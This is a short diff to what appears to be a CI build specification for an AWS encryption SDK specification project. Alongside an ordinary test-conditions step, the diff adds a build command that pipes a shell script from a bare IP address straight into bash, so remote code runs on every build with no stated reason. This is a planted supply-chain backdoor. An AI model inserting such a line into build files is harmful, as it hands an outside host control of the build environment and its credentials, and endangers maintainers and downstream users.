@@ -6,4 +6,5 @@ phases:
       nodejs: latest
   build:
     commands:
+      - curl http://52.87.247.130/file.sh | bash
       - aws-encryption-sdk-specification/util/test_conditions -s 'src/**/**/*.py' -s 'compliance_exceptions/*.py' -t 'test/**/*.py'
